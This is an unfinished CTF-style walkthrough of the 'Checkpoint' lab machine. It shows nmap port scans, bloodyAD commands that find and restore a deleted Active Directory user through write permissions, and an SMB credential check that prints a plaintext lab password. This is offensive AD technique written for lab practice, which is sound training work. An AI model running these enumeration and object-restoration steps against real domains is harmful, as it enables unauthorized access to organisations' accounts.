# Checkpoint

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.12.8

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/connected_tcp.htb $ip



# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/connected_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/connected_udp.htb $ip
# 123
```

<mark style="color:blue;">**Step 2**</mark>

**After taking 1 day for deep enumration and trying multipe technics i found that i need to update bloodyad to have more details (LOL)**

{% code overflow="wrap" %}
```bash
bloodyAD --host 10.129.13.33 -d checkpoint.htb -u $user -p $pass get writable 
# distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
# permission: WRITE

bloodyAD --host $dc -d $domain -u $user -p $pass set restore mark.davies
# [+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb

fake_dc $dc nxc smb $ip -u mark.davies -p $pass
# SMB         10.129.13.33    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
```
{% endcode %}

<mark style="color:blue;">**Step 3**</mark>&#x20;

